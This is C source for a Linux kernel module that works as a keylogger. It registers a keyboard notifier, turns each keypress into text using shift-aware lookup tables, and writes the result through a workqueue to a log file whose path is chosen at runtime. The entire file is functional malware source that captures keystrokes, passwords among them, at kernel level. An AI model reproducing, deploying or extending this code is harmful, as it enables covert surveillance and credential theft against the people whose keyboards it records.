#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <linux/sched.h>
#include <linux/fs.h>
#include <linux/keyboard.h>
#include <linux/semaphore.h>
#include <linux/slab.h>

#include "kernel_io.h"
#include "debug_helper.h"

#define SHIFT_R 42
#define SHIFT_L 54

struct semaphore s;

static int shiftPressed = 0;

char keylogger_set = 0;

struct file* log_fp = NULL;


static struct workqueue_struct *keylogger_wq;

typedef struct {
    struct work_struct my_work;
    char *dt;
    int size;
} writter_struct;

writter_struct *work_keylogger, *work_start;

// Key press without shift
static const char* keys[] = {"","[ESC]","1","2","3","4","5","6","7","8","9",
				"0","-","=","[BS]","[TAB]","q","w","e","r",
				"t","y","u","i","o","p","[","]","[ENTR]",
				"[CTRL]","a","s","d","f","g","h","j","k","l",
				";","'","`","[SHFT]","\\","z","x","c","v","b",
				"n","m",",",".","/","[SHFT]","",""," ",
				"[CAPS]","[F1]","[F2]","[F3]","[F4]","[F5]",
				"[F6]","[F7]","[F8]","[F9]","[F10]","[NUML]",
				"[SCRL]","[HOME]","[UP]","[PGUP]","-","[L]","5",
				"[R]","+","[END]","[D]","[PGDN]","[INS]",
				"[DEL]","","","","[F11]","[F12]","",
				"","","","","","","[ENTR]","[CTRL]",
				"/","[PSCR]","[ALT]","","[HOME]","[U]",
				"[PGUP]","[L]","[R]","[END]","[D]","[PGDN]",
				"[INS]","[DEL]","","","","","","","","[PAUS]"};
// Key press with shift
static const char* keysShift[] = {"","[ESC]","!","@","#","$","%","^","&","*",
				"(",")","_","+","[BS]","[TAB]","Q","W","E","R",
				"T","Y","U","I","O","P","{","}","[ENTR]",
				"[CTRL]","A","S","D","F","G","H","J","K","L",
				":","\"","~","[SHFT]","|","Z","X","C","V","B",
				"N","M","<",">","?","[SHFT]","",""," ",
				"[CAPS]","[F1]","[F2]","[F3]","[F4]","[F5]",
				"[F6]","[F7]","[F8]","[F9]","[F10]","[NUML]",
				"[SCRL]","[HOME]","[U]","[PGUP]","-","[L]","5",
				"[R]","+","[END]","[D]","[PGDN]","[INS]",
				"[DEL]","","","","[F11]","[F12]","",
				"","","","","","","[ENTR]","[CTRL]",
				"/","[PSCR]","[ALT]","","[HOME]","[U]",
				"[PGUP]","[L]","[R]","[END]","[D]","[PGDN]",
				"[INS]","[DEL]","","","","","","","","[PAUS]"};


static void keys_writer( struct work_struct * work)
{
    writter_struct *my_work = (writter_struct *)work;

    //dbg("Keylogger: my_work.x %d %s\n", my_work->size, my_work->dt );

    if (log_fp && keylogger_set)
    {
    	kfile_write(log_fp, my_work->dt, my_work->size);
    }	
    else {
		dbg_err_print("log_fp isnt set.");
	}
    kfree( (void *)my_work->dt );
    kfree( (void *)work );

    return;
}

// On key notify event, catch and run handler
int keylogger_callback(struct notifier_block *nblock, unsigned long kcode, void *p){
	
	char buf[32];
	int used_buf_len = 0;
	char * basePtr = buf;
	const char* endPtr = (buf + (sizeof(buf)-1));
	struct keyboard_notifier_param *param = (struct keyboard_notifier_param *)p;
	
	memset(buf, 0, sizeof(buf));

	if( !param )
	{
		dbg_err_print("Bad keyboard notification.");
		return NOTIFY_BAD;
	}

   	if( kcode == KBD_KEYCODE && param->value )
   	{
   		// If shift
    	if( param->value == SHIFT_R || param->value == SHIFT_L )
    	{
    		down(&s);
    		if(param->down > 0){
        		shiftPressed = 1;
		}	
    		else{
        		shiftPressed = 0;
			}
    		up(&s);
    		return NOTIFY_OK;
    	}

		// Store keys to buffer and write to file
		if(param->down)
		{
			int i;
			char c;
			i = 0;
			down(&s);
			if(shiftPressed)
			{
				while(i < strlen(keysShift[param->value])){
					c = keysShift[param->value][i];
					i++;
					*basePtr = c;
                	basePtr++;
                	used_buf_len++;
                	if(basePtr == endPtr)
                	{
						basePtr = buf;
					}
				}
			}
			else
			{
				while(i < strlen(keys[param->value]))
				{
		            c = keys[param->value][i];
		            i++;
		            *basePtr = c;
		            basePtr++;
		            used_buf_len++;
		            if(basePtr == endPtr)
		            {
		                basePtr = buf;
		            }
                }
			}
			up(&s);
			if (log_fp)
			{
				
				//kfile_write(log_fp, buf, used_buf_len);
				basePtr = buf;
			}
            if (keylogger_wq) {
                work_keylogger = (writter_struct *)kmalloc(sizeof(writter_struct), GFP_KERNEL);
                if (work_keylogger) {
                    INIT_WORK( (struct work_struct *)work_keylogger, keys_writer );
                    work_keylogger->size = strlen(buf);
                    work_keylogger->dt = kmalloc(strlen(buf)+1, GFP_KERNEL);
                    strncpy(work_keylogger->dt,buf,strlen(buf));
                    work_keylogger->dt[strlen(buf)] = '\0';
                    queue_work( keylogger_wq, (struct work_struct *)work_keylogger );
                }
            }
		}	
    }
    
 	return NOTIFY_STOP;
}

//Notifier handler
static struct notifier_block nb = {
        .notifier_call = keylogger_callback
};



void init_keylogger( void )
{
	keylogger_wq = create_workqueue("keylogger_q");
	work_start = (writter_struct *)kmalloc(sizeof(writter_struct), GFP_KERNEL);

	register_keyboard_notifier(&nb);
    //lock
	sema_init(&s, 1);
}


int set_keylogger(char * k_file_path)
{
	
	if (keylogger_set)
	{
		goto set_keylogger_done;
	}

	if (!log_fp)
	{
		if (!k_file_path)
			return 0;

		dbg_err_print("Try to open: %s.", k_file_path);

		// Open log file as write only, create if it doesn't exist.
		log_fp = kfile_open(k_file_path, O_WRONLY | O_CREAT, 0644);
		if(IS_ERR(log_fp)){
			dbg_err_print("FAILED to open log file.");
			log_fp = NULL;
			return 0;
		}
		else{
			// Log file opened, print debug message. 
			dbg_print("SUCCESSFULLY opened log file.");
		}
	}

	//Register the callback
	
	goto set_keylogger_done;

set_keylogger_done:
	keylogger_set = 1;
	dbg_err_print("Init keylogger.");
	return 1;
}

void unset_keylogger(void){

	if (!keylogger_set)
		return;

	keylogger_set = 0;
	
	return;
}

int switch_keylogger( char * path )
{
	dbg_print("switch_keylogger - keylogger_set %d.", keylogger_set);
	if (keylogger_set == 0)
	{
		return set_keylogger(path);	
	}
	if (keylogger_set == 1){
		unset_keylogger();
	}
	return 0;
}

void clean_keylogger(void )
{
	unset_keylogger();

	if (keylogger_wq)
	{
		flush_workqueue( keylogger_wq );
	    destroy_workqueue( keylogger_wq );	
	}
	else {
		dbg_err_print("keylogger_wq isnt set.\n");
	}
	
	// Close log file handle.
	if(log_fp != NULL){
		kfile_close(log_fp);
	}

	unregister_keyboard_notifier(&nb);

	// Should remove the file
	
}
